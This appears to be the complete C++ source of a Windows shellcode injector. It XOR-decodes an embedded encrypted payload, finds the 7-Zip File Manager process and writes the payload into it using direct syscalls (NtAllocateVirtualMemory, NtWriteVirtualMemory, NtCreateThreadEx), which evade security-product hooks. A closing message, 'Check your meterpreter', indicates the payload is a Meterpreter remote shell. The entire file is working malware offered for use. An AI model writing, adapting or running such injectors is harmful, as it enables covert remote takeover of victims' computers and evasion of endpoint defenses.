#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include "syscalls_common.h" 

/////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////// COMPILE ME IN VISUAL STUDIO /////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////

HANDLE getHandle() {
    HANDLE hProcess; // Handle to the Process

    // enumerate through all windows processes to get their PIDs 
    HANDLE processsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0); // CreateToolhelp32Snapshot takes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes.
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) }; //Set the size of the structure before using it
    DWORD64 dwProcessId;
    // Find the PID of 7zFM.exe and save it for later
    if (Process32First(processsnapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, L"7zFM.exe") != 0) {
            Process32Next(processsnapshot, &processEntry);
        }
    }
    // Contains the ID of 7zFM.exe
    dwProcessId = processEntry.th32ProcessID;
    // get a handle to the process 
    OBJECT_ATTRIBUTES pObjectAttributes;
    InitializeObjectAttributes(&pObjectAttributes, NULL, NULL, NULL, NULL);
    CLIENT_ID pClientId;
    pClientId.UniqueProcess = (PVOID)dwProcessId;
    pClientId.UniqueThread = (PVOID)0;

    NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &pObjectAttributes, &pClientId); // make a syscall with syswhisprs to get a handle to calc.exe
    return hProcess;
}





int main(int argc, char** argv) {
    /////////////////////////////// Shellcode retrieval ////////////////////////////// 

    printf("\nDecrypting shellcode\n");
    char encryptedShellcode[] = "\x96\x20\xe9\x8c\x9a\x80\xa6\x68\x6a\x68\x2b\x39\x2b\x38\x38\x39\x3c\x20\x5b\xba\x0f\x20\xe1\x3a\x0a\x20\xe1\x3a\x72\x20\xe1\x3a\x4a\x20\x65\xdf\x20\x22\x27\x59\xa3\x20\xe1\x1a\x3a\x20\x5b\xa8\xc6\x54\x0b\x14\x68\x44\x4a\x29\xab\xa1\x67\x29\x6b\xa9\x88\x85\x38\x20\xe1\x3a\x4a\xe3\x28\x54\x22\x69\xba\x29\x3b\x0e\xeb\x10\x72\x63\x68\x67\xef\x1a\x6a\x68\x6a\xe3\xea\xe0\x6a\x68\x6a\x20\xef\xa8\x1e\x0f\x22\x69\xba\xe3\x22\x70\x2e\xe3\x2a\x48\x3a\x21\x6b\xb8\x89\x3e\x27\x59\xa3\x20\x95\xa1\x2b\xe3\x5e\xe0\x22\x69\xbc\x20\x5b\xa8\xc6\x29\xab\xa1\x67\x29\x6b\xa9\x52\x88\x1f\x99\x26\x6b\x26\x4c\x62\x2d\x53\xb9\x1f\xb0\x32\x2c\xe1\x28\x4e\x21\x6b\xb8\x0c\x29\xe1\x64\x22\x2c\xe1\x28\x76\x21\x6b\xb8\x2b\xe3\x6e\xe0\x22\x69\xba\x29\x32\x29\x32\x36\x33\x32\x2b\x30\x2b\x31\x2b\x32\x22\xeb\x86\x48\x2b\x3a\x95\x88\x32\x29\x33\x32\x22\xe3\x78\x81\x21\x97\x95\x97\x37\x21\xd4\x1f\x19\x5a\x35\x5b\x58\x68\x6a\x29\x3c\x21\xe3\x8e\x22\xe9\x86\xc8\x6b\x68\x6a\x21\xe3\x8d\x23\xd4\x68\x68\x6b\xd3\xaa\xc0\x98\xe8\x2b\x3c\x23\xe1\x8e\x24\xe3\x99\x2b\xd2\x26\x1f\x4c\x6f\x95\xbd\x26\xe1\x80\x00\x6b\x69\x6a\x68\x33\x29\xd0\x41\xea\x03\x6a\x97\xbf\x02\x60\x29\x34\x38\x3a\x25\x5b\xa1\x27\x59\xaa\x20\x95\xa8\x22\xe1\xa8\x20\x95\xa8\x22\xe1\xab\x29\xd0\x82\x65\xb7\x8a\x97\xbf\x20\xe3\xaf\x00\x78\x2b\x30\x26\xe1\x88\x20\xe3\x91\x2b\xd2\xf3\xcd\x1e\x09\x95\xbd\xef\xa8\x1e\x62\x23\x97\xa4\x1d\x8f\x80\xf9\x68\x6a\x68\x22\xeb\x86\x78\x22\xe1\x88\x25\x5b\xa1\x00\x6c\x2b\x30\x22\xe1\x93\x29\xd0\x6a\xb3\xa0\x35\x97\xbf\xeb\x92\x68\x14\x3d\x22\xeb\xae\x48\x34\xe1\x9c\x02\x2a\x29\x33\x00\x6a\x78\x6a\x68\x2b\x30\x22\xe1\x98\x20\x5b\xa1\x2b\xd2\x32\xcc\x39\x8d\x95\xbd\x22\xe1\xa9\x21\xe3\xaf\x27\x59\xa3\x21\xe3\x98\x22\xe1\xb0\x20\xe3\x91\x2b\xd2\x68\xb1\xa2\x37\x95\xbd\xe9\x90\x6a\x15\x42\x30\x2b\x3f\x33\x00\x6a\x28\x6a\x68\x2b\x30\x00\x68\x30\x29\xd0\x63\x45\x67\x5a\x97\xbf\x3f\x33\x29\xd0\x1d\x04\x25\x0b\x97\xbf\x21\x95\xa6\x83\x54\x95\x97\x95\x20\x6b\xab\x22\x41\xac\x20\xef\x9e\x1f\xdc\x2b\x97\x8d\x30\x00\x68\x33\xd3\x8a\x75\x40\x62\x2b\xe1\xb0\x97\xbf";
    char key[] = "jhjhjh";
    size_t legitrick_len = sizeof(encryptedShellcode);


    char encodedlegitrick[sizeof encryptedShellcode];

    /////////////////////////////// XOR decoding ////////////////////////////// 

    int j = 0;
    for (int i = 0; i < sizeof encryptedShellcode; i++) {
        if (j == sizeof key - 1) j = 0;
        encodedlegitrick[i] = encryptedShellcode[i] ^ key[j];
        j++;
    }


    /////////////////////////////// Shellcode Execution ////////////////////////////// 

    // groundwork to inject our shellcode into a process later on
    HANDLE hThread = NULL;              // Handle to the Thread
    HANDLE hProcess = getHandle();      // Retrieve the handle for calc.exe and declare a handle for one of the threads. NtOpenProcess is declared in there
    LPVOID lpAllocationStart = nullptr;
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"); //When LoadLibrary is called in a process, it maps a DLL into that process. LoadLibrary needs to know what DLL to load, so you need to provide it the path to the DLL on your system. LoadLibrary will then find the DLL at that path and load that DLL into memory for you.

    printf("\nInjecting...\n");
    NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, &legitrick_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);// Allocate memory with permissions RW
    NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)encodedlegitrick, legitrick_len, nullptr); // Write code into memory
    ULONG old_protect;
    NtProtectVirtualMemory(hProcess, &lpAllocationStart, &legitrick_len, PAGE_EXECUTE_READ, &old_protect);// Change permissions to RX
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpAllocationStart, lpStartAddress, FALSE, 0, 0, 0, nullptr);
    printf("\nCheck your meterpreter :D\n");
    NtClose(hProcess);

}
